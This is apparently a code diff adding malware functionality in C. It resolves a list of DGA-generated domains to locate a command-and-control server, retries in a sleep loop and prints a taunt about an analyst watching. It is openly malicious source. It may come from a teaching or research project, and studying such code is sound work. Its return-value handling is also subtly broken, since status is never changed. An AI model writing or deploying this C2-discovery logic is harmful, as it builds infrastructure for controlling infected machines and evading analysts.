@@ -89,12 +89,41 @@ cleanup:
 
 
 // Walk through our list of DGAs, attempt to resolve each name 
-int resolveAddress(char** address)
+int resolveAddress(char** agds, char** address)
 {
-    int status = 1;
+    bool found = false;
+    int status = 1, index = 0;
+    struct hostent *host_info;
+    struct in_addr *address_calc;
 
-    // Walk through our entries; if entire list doesnt resolve then wait 5 seconds before trying again 
+    // While we still havent found our address
+    while(!found)
+    {
+        // Keep walking our list
+        while(index < 10)
+        {
+            host_info = gethostbyname(agds[index]);
+            if (host_info != NULL)
+            {
+                address_calc = (struct in_addr*) (host_info->h_addr);
+                printf("Found IP!: %s\n", inet_ntoa(*address_calc));
+                memcpy(*address, (void*)inet_ntoa(*address_calc), 15); // lazy copy 
+                found = true;
+                break;
+            }
+            
+            index += 1;
+        }
 
+        if (!found)
+        {
+            // We walked the whole list and didn't come up with an address, so sleep and try again
+            printf("Failed to resolve domain; analyst is watching... going to sleep...\n");
+            index = 0;
+            sleep(5);
+        }
+    }
+    
 
 cleanup:
     return status;
@@ -137,6 +166,14 @@ int determineC2Address(char** address)
     }
 
     // Try to resolve each via DNS; sleep if fail all, then retry 
+    if (!resolveAddress(agds, address))
+    {
+        printf("Failed to resolve address!\n");
+        status = 0;
+        goto cleanup;
+    }
+
+    printf("Address for C2 is %s\n", *address);
 
 
 cleanup:
